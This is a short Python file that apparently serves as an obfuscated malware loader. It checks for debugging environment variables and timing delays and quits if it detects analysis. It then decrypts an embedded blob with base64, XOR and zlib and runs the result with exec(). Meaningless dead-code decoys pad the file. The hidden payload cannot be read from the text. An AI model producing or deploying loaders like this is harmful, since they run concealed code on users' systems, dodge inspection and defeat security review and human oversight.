
import base64 as swzOioLf, zlib as dINnihQd, marshal as NUgMfplM, hashlib as __h, os as mjlHVxmZ, sys as drBUnqse, time as WeTQOwDC

LykYXdyY = 6623
xChnQAGT = 'v9NSnMtdPmA5'
sxwqCTKo = lambda x: x

def LiEbRuBN():
    x = 0
    for i in range(5):
        x += i
    return x


QyaUwLDA = [178, 149, 128, 131, 141, 132, 170, 142, 133, 136, 211, 208, 178, 128, 141, 149, 178, 149, 147, 136, 143, 134, 163, 150, 180, 138]
yYsywlIn = 225
JlMlXPbv = ''.join(chr(b ^ yYsywlIn) for b in QyaUwLDA)
XoxzpICF = __h.sha256(JlMlXPbv.encode()).digest()

def uEwBilBh():
    suspicious = ['PYTHONINSPECT', 'PYTHONDEBUG', 'PYTHONVERBOSE']
    for v in suspicious:
        if mjlHVxmZ.environ.get(v):
            drBUnqse.exit(1)
    t1 = WeTQOwDC.time()
    WeTQOwDC.sleep(0.1)
    t2 = WeTQOwDC.time()
    if t2 - t1 > 0.5:
        drBUnqse.exit(1)

uEwBilBh()

hXOZKYCE_data = ["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"]
hXOZKYCE_key = ["8xEAAADhHGSrGx6j0AxlQRe9KbGn7g=="]

hXOZKYCE_data_joined = ''.join(hXOZKYCE_data)
hXOZKYCE_key_joined = ''.join(hXOZKYCE_key)

UnvimStX = swzOioLf.b64decode(hXOZKYCE_key_joined)
ZuQKdtIN = NUgMfplM.loads(UnvimStX)
YKDaMFxT = bytes([b ^ XoxzpICF[i % len(XoxzpICF)] for i, b in enumerate(ZuQKdtIN)]).decode()

hXOZKYCE_enc = swzOioLf.b64decode(hXOZKYCE_data_joined)
lyZIvhoR = bytes([b ^ ord(YKDaMFxT[i % len(YKDaMFxT)]) for i, b in enumerate(hXOZKYCE_enc)])
mNIDqPcM = dINnihQd.decompress(lyZIvhoR)

if 1 == 2:
    print("This never runs")
while False:
    print("Nor does this")
try:
    assert 1 == 0
except:
    pass

exec(mNIDqPcM)
